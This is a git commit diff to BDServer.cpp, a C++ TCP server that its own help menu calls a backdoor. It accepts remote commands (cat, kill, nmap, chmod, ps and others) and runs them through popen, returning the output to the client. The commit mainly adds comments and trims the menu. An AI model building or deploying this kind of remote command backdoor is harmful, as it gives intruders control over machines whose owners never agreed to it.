ca87b6bc28deafaa679fcbd89cc8128a476cc228
TyroneL <tyronelagore@gmail.com>
2017-01-26 13:53:25 -0700

    altered menu to reflect actually available commands (removed extraneous commands that were not required and would cause a lot of work). Also commented all functions. Removed a function that was not being used.

--- src/BDServer.cpp
+++ src/BDServer.cpp
@@ -7,8 +7,8 @@ BDServer :: BDServer(){
   _PortNo = DEFAULT_PORTNO;
 
   //initialize server socket and client socket to known state
-  _ServerSocket = 0;
-  _ClientSocket = 0;
+  _ServerSocket = -1;
+  _ClientSocket = -1;
 }
 
 /*
@@ -25,8 +25,8 @@ BDServer :: BDServer(int portNo){
   }
 
   //initialize server socket and client socket to known state
-  _ServerSocket = 0;
-  _ClientSocket = 0;
+  _ServerSocket = -1;
+  _ClientSocket = -1;
 
 }
 
@@ -48,10 +48,17 @@ void BDServer :: startServer(){
   waitForConnection();
 }
 
+/*
+  waitForConnection
+
+  waitForConnection will listen for a connection on the server socket, but only if the server socket has been
+  initialized. Once the client is connected, a message is sent to the client to confirm that the server is connected
+  and the server waits for a command.
+ */
 void BDServer :: waitForConnection(){
   char buffer[1024];
 
-  if (_ServerSocket > 0){
+  if (_ServerSocket > -1){
     if(listen(_ServerSocket, 1) == 0){
       printf("Listening\n");
     }
@@ -60,10 +67,11 @@ void BDServer :: waitForConnection(){
     _AddrSize = sizeof _ServerStorage;
     _ClientSocket = accept(_ServerSocket, (struct sockaddr *) &_ServerStorage, &_AddrSize);
 
-    printf("Client connected. Handshaking.\n");
+    printf("Client connected.\n");
 
     strcpy(buffer, "Server: Connected.\n");
     write(_ClientSocket, buffer, strlen(buffer));
+    
     //once a conncetion has been made, wait for a command
     waitForCommand();
   }else{
@@ -75,7 +83,10 @@ void BDServer :: waitForConnection(){
   waitForCommand
 
   waitForCommand assumes that a TCP connection has been made to a client.
-  It then waits for a command to be sent from the client to parse
+  It then waits for a command to be sent from the client to parse and execute
+  if the command is one that the sevrer can handle. If waitForCommand receives
+  the string "off" or "help", then it handles the command directly, otherwise
+  it hands the connection off to be parsed.
 */
 void BDServer :: waitForCommand()
 {
@@ -85,6 +96,7 @@ void BDServer :: waitForCommand()
   terminalLine();
   
   amountRead = read(_ClientSocket, buffer, MAX_PATH);
+  
   while(amountRead > 0){
     trimLeft(buffer, strlen(buffer));
     trimRight(buffer, strlen(buffer));
@@ -120,6 +132,13 @@ void BDServer :: waitForCommand()
   waitForConnection();
 }
 
+/*
+  terminalLine
+
+  terminalLine simply prints a neatly formatted terminal line displaying the Directory stats (such as current working directory)
+  with a terminal prompt underneath for the client.
+
+ */
 void BDServer :: terminalLine(){
   char buffer[MAX_PATH];
   memcpy(buffer, "\n-----------------------------------------------\n\0", 51);
@@ -135,7 +154,42 @@ void BDServer :: terminalLine(){
 /*
   parseCommand
 
-  parses commannds
+  Parses commands received from the client. First the command is split on whitespace to find
+  the function being requested (ls, cd, cat, etc), then the command is split again on whitespace
+  to retrieve arguments. parseCommand has two main logic pathways: functions with arguments and 
+  functions without. If the command is not one that the server has been built to handle, a message
+  will be sent to the client indicating that it cannot handle the command. If the command is one with
+  output, then the output will be returned to the client (ls, cd, pwd, etc). If the command is one without, 
+  then no output will be sent to the client (chmod, kill).
+
+  Assumptions: It is assumed that the client sending the command knows the particular syntax of the 
+  arugments for the function for which they have sent. For example, if the client sends kill, a valid
+  function, with -adlkasjdklj, an invalid argument, the command will simply fail and no output will be sent
+  to the client. This is due to the issue the popen does not return failed text to the popen file stream, but
+  rather to the environment in which the server is running.
+
+  There are ways around this, such as hijacking the output stream of the server, however we felt that it was
+  an acceptable assumption that the user connecting to the server knows the basics of the linux commands they are sending
+  and that a graceful failure to execute the command was enough for the servers purposes.
+
+  Accepted commands:
+  pwd							- print working directory
+  cd [dir]						- change directory to <dir>
+  ls [params]					        - list the contents of the current working directory
+  ll 							- (ls -FGlAihp) more detailed ls
+  cat <file>						- return contents of <file>
+  who							- list currently logged in users
+  net							- show current network configuration
+  ps [params]						- show currently running processes
+  kill <params> 					- runs kill command with given parameters
+  nmap <params>						- run nmap with <params>
+  netstat <params>					- Display routing table
+  chmod <permissions> <file>				- change <file> accessibility to <permissions>
+
+  Any of the above where the parameters are in angle brackets <params>, the parameters are required.
+  Any of the above commands where the parameters are in square brackets [params], the parameters are optional and the
+  function has a runnable command with no arguments.
+  
 */
 
 void BDServer :: parseCommand(char* command){
@@ -145,9 +199,6 @@ void BDServer :: parseCommand(char* command){
   char* arguments = (char*)calloc(1024, 1);
   free(arguments);
   
-  trimLeft(command, strlen(command));
-  trimRight(command, strlen(command));
-
   //strtok modifies the past in string - make a copy.
   cpy = (char*)calloc(strlen(command), 1);
   memcpy(cpy, command, strlen(command));
@@ -195,11 +246,11 @@ void BDServer :: parseCommand(char* command){
       
     }else if (strcmp(function, "netstat") == 0){
       
-    }else if (strcmp(function, "route") == 0){
-      
     }else if (strcmp(function, "chmod") == 0){
       
     }else if (strcmp(function, "apt-get") == 0){
+
+    }else if (strcmp(function, "ps") == 0){
 
     }else{
       badFunction(command);
@@ -229,7 +280,12 @@ void BDServer :: badFunction(char *command)
 
   executeCommand takes in a command and executes it and redirects the output
   of the response so that the output can be sent to the client socket.
+  
+  If a command is received that fails to run, no output is sent to the client
+  to indicate as such as popen prints the error output to the running executable rather than
+  to the file descriptor.
 
+  Our reasoning behind not changing this is described in the comments of parseCommand
 */
 void BDServer :: executeCommand(char* command)
 {
@@ -265,30 +321,32 @@ void BDServer :: executeCommand(char* command)
   free(output);
 }
 
+
+/*
+  helpMenu
+
+  Displays a neatly formatted menu to the screen for the client to view all possible commands
+ */
 void BDServer :: helpMenu(){
   printf("Printing command list and descriptions...\n");
-  char buffer[MAX_PATH];
-  memcpy(buffer, "Command listings:\n"
+  char buffer[MAX_PATH] = "Command listings:\n"
 	 "-----------------------------------------------\n"
+         "[] indicates optional arguments, <> indicates required\n"
 	 "pwd							- print working directory\n"
-	 "cd <dir>						- change directory to <dir>\n"
-	 "ls							- list the contents of the current working directory\n"
+	 "cd [dir]						- change directory to <dir>\n"
+	 "ls [params]						- list the contents of the current working directory\n"
 	 "ll 							- (ls -FGlAihp) more detailed ls\n"
 	 "cat <file>						- return contents of <file>\n"
 	 "who							- list currently logged in users\n"
 	 "net							- show current network configuration\n"
 	 "ps							- show currently running processes\n"
-	 "kill -9 <pid> 						- kill process <pid>\n"
+	 "kill -9 <pid> 					- kill process <pid>\n"
 	 "nmap <params>						- run nmap with <params>\n"
-	 "netstat -r 						- Display routing table\n"
-	 "route flush 						- flush routing tables\n"
-	 "route add -net <ipaddr> gw <gateway> 			- Add a route to the table through <ipaddr>, <gateway>\n"
-	 "ext <program> <params>					- run <program> with <parameters>\n"
+	 "netstat <params>					- Display routing information (-r for example)\n"
 	 "chmod <permissions> <file>				- change <file> accessibility to <permissions>\n"
-	 "apt-get install <pkg> 					- Install <pkg>\n\n"
 	 "help							- print this list of commands\n"
 	 "off							- terminate the backdoor program\n"
-	 "-----------------------------------------------\n\n\0", 1046);
+    "-----------------------------------------------\n\n\0";
   write(_ClientSocket, buffer, strlen(buffer)-1);
   memset(buffer, 0, MAX_PATH);
 }
@@ -296,11 +354,11 @@ void BDServer :: helpMenu(){
 /*
   printWorkingDirectory
 
-  prints the working directory, else tells user bad
+  prints the working directory, else tells user bad directory. Should not fail unless the server
+  somehow finds itself in the directory to which it does not have permissions.
  */
 void BDServer :: printWorkingDirectory(){
   char dir[1024];
-  printf("%d\n", sizeof(dir));
   if (getcwd(dir, sizeof(dir)) != NULL){
     write(_ClientSocket, dir, strlen(dir));
   }else{
@@ -311,13 +369,17 @@ void BDServer :: printWorkingDirectory(){
 }
 
 /*
+  printDirectoryStats
 
+  prints some statisitcs about the current directory in a neatly formatted line.
+  currently, only prints the current working directory, but may be modified in the future to include
+  stats such as currently logged in user, ip, etc.
  */
 void BDServer :: printDirectoryStats(){
   char dir[1024];
   char *buffer = (char*)malloc(1029);
   char *placeholder = buffer;
-  printf("%d\n", sizeof(dir));
+  
   if (getcwd(dir, sizeof(dir)) != NULL){
     memcpy(buffer, "@[", 2);
     buffer += 2;
@@ -331,6 +393,12 @@ void BDServer :: printDirectoryStats(){
   free(buffer);
 }
 
+/*
+  changeDirectory
+
+  Changes the working directory to the specified directory. If a bad directory is given,
+  the client is notified.
+ */
 void BDServer :: changeDirectory(char *directory){
   int ret = chdir(directory);
   printf("%s\n", directory);
@@ -340,25 +408,30 @@ void BDServer :: changeDirectory(char *directory){
   }
 }
 
+/*
+  resetConnection
 
+  resetConnection is called when a client disconnect is detected. It closes the current client
+  socket and resets the client socket to a known state (for later error detection).
+ */
 void BDServer :: resetConnection(){
   close(_ClientSocket);
 
-  _ClientSocket = 0;
+  _ClientSocket = -1;
 }
 
+/* UTIL Section
+   
+   We did not feel there were enough utility functions to warrent their own class just yet,
+   however if this section grows - they will be moved to their own file
+ */
 
-/* Getters/Setters */
-void BDServer :: setPort(int port){
-  if(port > 256 && port <= 65535){
-    _PortNo = port;
-  }
-}
 
-int BDServer :: getPort(){
-  return _PortNo;
-}
+/*
+  trimLeft
 
+  trims the whitespace to the left of the string and moves all characters into the 0 indexed position
+ */
 void BDServer :: trimLeft(char *input, int length){
   int index = 0, i = 0;
 
@@ -374,6 +447,12 @@ void BDServer :: trimLeft(char *input, int length){
   input[i] = '\0';
 }
 
+/*
+  trimRight
+
+  trims the whitespace to the right of the string and replaces the whitespace with null terminators
+  to ensure easy usage later with functions such as strlen and strcmp
+ */
 void BDServer :: trimRight(char *input, int length){
   int index = length - 1;
 
@@ -383,13 +462,14 @@ void BDServer :: trimRight(char *input, int length){
   }
 }
 
-bool BDServer :: contains(char *input, char ch){
-  int i = 0;
-  bool found = false;
-  while(i < strlen(input) && !found){
-    if(input[i] == ch)
-      found = true;
+/* Getters/Setters */
+void BDServer :: setPort(int port){
+  if(port > 256 && port <= 65535){
+    _PortNo = port;
   }
-
-  return found;
 }
+
+int BDServer :: getPort(){
+  return _PortNo;
+}
+/* End getters/Setters */
